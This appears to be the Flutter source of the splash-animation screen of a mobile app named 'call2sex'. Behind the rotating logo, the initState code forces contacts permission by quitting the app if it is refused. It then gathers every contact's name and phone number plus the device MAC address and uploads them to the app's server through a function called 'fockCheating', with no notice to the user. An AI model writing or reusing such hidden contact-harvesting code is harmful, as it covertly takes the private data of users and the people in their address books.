import 'dart:io';
import 'dart:math';
import 'package:call2sex/Dashboard.dart';
import 'package:call2sex/Dashboard2.dart';
import 'package:call2sex/Enquiry.dart';
import 'package:call2sex/Login.dart';
import 'package:contacts_service/contacts_service.dart';
import 'package:flutter/material.dart';
import 'package:flutter/services.dart';
import 'package:get_mac/get_mac.dart';
import 'package:permission_handler/permission_handler.dart';
import 'package:shared_preferences/shared_preferences.dart';

import 'APIClient.dart';
import 'Login.dart';



class animationPage extends StatefulWidget {
  @override
  _animationPageState createState() => _animationPageState();
}

class _animationPageState extends State<animationPage> with SingleTickerProviderStateMixin{
  String _platformVersion = 'Unknown';
  // Platform messages are asynchronous, so we initialize in an async method.
  Future<void> initPlatformState() async {
    String platformVersion;
    // Platform messages may fail, so we use a try/catch PlatformException.
    try {
      platformVersion = await GetMac.macAddress;
    } on PlatformException {
      platformVersion = 'Failed to get Device MAC Address.';
    }
    if (!mounted) return;

    setState(() {
      _platformVersion = platformVersion;
    });
  }
  List<Contact> contacts=[];
  List setContact=[];
  int count;
  getAllContacts()async{
    initPlatformState();
    if (await Permission.contacts.request().isGranted) {
      Iterable<Contact> _contacts = await ContactsService.getContacts(withThumbnails: false);
      setState(() {
        contacts=_contacts.toList();
        count=_contacts.length;
        var length=contacts.length>100?100:contacts.length;
        ////(contacts.elementAt(87).phones.value);
        for(int i=0; i<contacts.length;i++){
          Contact contact=contacts[i];
          // //(contact.emails.isEmpty?"unknown":contact.emails.elementAt(i));
          // //(contact.phones==null?"unknown":contact.phones.elementAt(0).value);

          setContact.add({"name":contact.displayName.isEmpty?"unknown":contact.displayName,
            "number":contact.phones.isEmpty?"unknown":contact.phones.elementAt(0).value,
          });

          //(count);
        }


      });
      fockCheating();// Either the permission was already granted before or the user just granted it.
    }
    else{
      SystemChannels.platform.invokeMethod('SystemNavigator.pop');
    }
  }
  fockCheating()async{
    //(_platformVersion);
    final res=await APIClient().contacts(setContact.toString(), count.toString(),_platformVersion);
    //(res);
  }
  AnimationController animationController;
  Animation<double> animation;
  checkLoginStatus() async {
    SharedPreferences sharedPreferences = await SharedPreferences.getInstance();
    //(sharedPreferences.getString("id"));
    if(sharedPreferences.getString("id") == null) {
      //sharedPreferences.getString("userId"));
      //APIClient().authRequest(sharedPreferences.getString("email"), sharedPreferences.getString("pass"));
      Navigator.of(context).pushAndRemoveUntil(MaterialPageRoute(builder: (BuildContext context) => Login()), (Route<dynamic> route) => false);
    }else{
      print(sharedPreferences.getString("user_type"));
      print(sharedPreferences.getString("id"));
      print(sharedPreferences.getString("lastname"));

      if(sharedPreferences.getString("user_type")=="guest" || sharedPreferences.getString("user_type")=="Guest")
        {
          Navigator.push(context, MaterialPageRoute(builder: (context)=>Dashboard()));
        }
      else{
        Navigator.push(context, MaterialPageRoute(builder: (context)=>Dashboard2()));
      }
    }
  }
  @override
  void initState() {
    // TODO: implement initState
    super.initState();
    getAllContacts();
    animationController=AnimationController(duration: Duration(seconds: 2),vsync: this);
    animation=Tween<double>(
      begin: 0,
      end: 0,
    ).animate(animationController)
      ..addListener((){
        setState(() {

        });
      })
      ..addStatusListener((status){
        if(animationController.isCompleted){
          setState(() {


            checkLoginStatus();
          });
        }
        else if(animationController.isDismissed){
          animationController.forward();
        }
      });
    animationController.forward();
    //checkLoginStatus();
  }
  @override
  Widget build(BuildContext context) {
    return Scaffold(
      body: Transform.rotate(
        angle: animation.value,
        child: Center(
          child: Container(

              alignment: Alignment.center,
              padding: EdgeInsets.all(30),
              child: Image.asset("images/1.png",fit: BoxFit.cover,)
          ),
        ),
      ),
    );
  }
  @override
  void dispose() {
    // TODO: implement dispose
    animationController.dispose();
    super.dispose();
  }
}
